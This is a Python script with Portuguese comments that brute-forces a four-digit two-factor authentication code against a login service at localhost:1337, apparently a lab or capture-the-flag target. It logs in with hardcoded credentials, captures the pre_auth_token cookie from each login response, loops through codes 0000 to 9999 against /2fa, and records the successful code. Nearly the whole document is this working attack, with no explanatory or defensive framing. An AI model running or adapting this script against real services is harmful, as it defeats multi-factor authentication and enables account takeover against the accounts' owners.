import requests
from http.cookies import SimpleCookie

BASE = "http://localhost:1337"
LOGIN_URL = f"{BASE}/login"
TWOFA_URL = f"{BASE}/2fa"

# ====== CONFIG ======
USERNAME = "windows96"
PASSWORD = "iloveyou2"
# PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # opcional p/ Burp
PROXIES = None
# ====================

COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
}
LOGIN_HEADERS = {
    **COMMON_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE,
    "Referer": f"{BASE}/login",
}
TWOFA_HEADERS = {
    **COMMON_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE,
    "Referer": f"{BASE}/2fa",
}

def extract_pre_auth_from_response(resp: requests.Response):
    """Tenta extrair pre_auth_token da resposta (cookies parseados e Set-Cookie cru)."""
    # 1) cookies já parseados pelo requests
    val = resp.cookies.get("pre_auth_token") or resp.cookies.get("pre-auth-token")
    if val:
        return val
    # 2) varre o header Set-Cookie (pode ter múltiplos)
    raw = resp.headers.get("Set-Cookie", "")
    if raw:
        # Tenta quebrar em possíveis cookies (abordagem simples e prática)
        parts = raw.split(",")
        for part in parts:
            sc = SimpleCookie()
            try:
                sc.load(part)
            except Exception:
                continue
            for name in ("pre_auth_token", "pre-auth-token"):
                if name in sc:
                    return sc[name].value
    return None

def is_success_2fa(resp: requests.Response) -> bool:
    """Heurística básica para considerar sucesso no 2FA."""
    if resp.status_code in (302, 303, 307, 308):
        return True
    if "Set-Cookie" in resp.headers and "session" in resp.headers["Set-Cookie"].lower():
        return True
    txt = resp.text.lower()
    ok_terms = ("2fa concluída", "bem-vindo", "dashboard")
    fail_terms = ("código inválido", "2fa falhou", "tente novamente", "invalid")
    return any(t in txt for t in ok_terms) and not any(t in txt for t in fail_terms)

def salvar_resposta_http(resp, caminho_arquivo):
    # Monta uma representação "crua" legível da resposta HTTP
    status_line = f"HTTP/1.1 {resp.status_code}\n"
    headers_str = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    body_str = resp.text  # use resp.content para binário

    with open(caminho_arquivo, "w", encoding="utf-8", errors="ignore") as f:
        f.write(status_line)
        f.write(headers_str)
        f.write("\n\n")   # linha em branco separando headers do corpo
        f.write(body_str)


def main():
    initial_pre_auth = ""
    for code in range(10000):
        data = {'code':f"{code:04d}"}
        with requests.Session() as s:
            if PROXIES:
                s.proxies.update(PROXIES)

            # ---------- 1) POST /login com o cookie inicial ----------
            s.cookies.clear()
            # define exatamente o cookie inicial para localhost
            s.cookies.set("pre_auth_token", initial_pre_auth, domain="localhost", path="/")

            login_data = {"username": USERNAME, "password": PASSWORD}
            try:
                resp_login = s.post(
                    LOGIN_URL,
                    headers=LOGIN_HEADERS,
                    data=login_data,
                    allow_redirects=False,   # importante p/ capturar Set-Cookie desta resposta
                    timeout=10,
                )
            except requests.RequestException as e:
                print(f"[!] Erro de rede no POST /login: {e}")
                return

            print(f"[POST /login] status={resp_login.status_code}")

            # ---------- 2) Captura a troca do cookie ----------
            pre_auth_for_2fa = extract_pre_auth_from_response(resp_login)
            if not pre_auth_for_2fa:
                # fallback: tenta ver se a session já armazenou (caso o servidor tenha enviado em redirect que não seguimos)
                pre_auth_for_2fa = s.cookies.get("pre_auth_token") or s.cookies.get("pre-auth-token")
            initial_pre_auth = pre_auth_for_2fa
            if not pre_auth_for_2fa:
                print("[!] Não foi possível extrair o novo 'pre_auth_token' após o login.")
                print("    Set-Cookie do login:", resp_login.headers.get("Set-Cookie"))
                print("    Cookies da sessão:", s.cookies.get_dict())
                return

            print(f"[✓] Novo pre_auth_token capturado: {pre_auth_for_2fa}")

            # ---------- 3) POST /2fa usando o cookie atualizado ----------
            cookies_2fa = requests.cookies.RequestsCookieJar()
            cookies_2fa.set("pre_auth_token", pre_auth_for_2fa, domain="localhost", path="/")

            try:
                resp_2fa = s.post(
                    TWOFA_URL,
                    headers=TWOFA_HEADERS,
                    data=data,
                    cookies=cookies_2fa,     # força usar o token atualizado
                    allow_redirects=False,
                    timeout=10,
                )
            except requests.RequestException as e:
                print(f"[!] Erro de rede no POST /2fa: {e}")
                return

            salvar_resposta_http(resp_2fa, "resposta_2fa.txt")

            print(f"[POST /2fa] code={str(code).zfill(4)}")
            print(f"[POST /2fa] status={resp_2fa.status_code}")
            ok = is_success_2fa(resp_2fa)
            print("2FA teve sucesso" if ok else "2FA falhou")

            if ok:
                try:
                    with open("resultado_2FA", "a", encoding="utf-8") as f:
                        location = resp_2fa.headers.get("Location", "")
                        f.write(f"code={str(code).zfill(4)} | status={resp_2fa.status_code} | location={location}\n")
                        break
                except Exception as e:
                    print(f"[!] Erro ao escrever em 'resultado_2FA': {e}")
                    break
            code+=1

if __name__ == "__main__":
    main()
